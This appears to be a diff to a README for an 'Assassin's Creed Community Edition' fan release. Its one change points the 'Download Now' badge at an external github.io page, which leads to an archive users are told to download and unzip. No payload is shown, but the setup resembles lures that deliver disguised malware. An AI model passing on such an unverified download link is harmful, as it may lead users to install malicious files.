@@ -8,7 +8,7 @@ This edition aims to preserve the **atmosphere and story of Altair’s journey**
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://assassins-creed-community-edition.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install Assassin’s Creed (original PC version).  
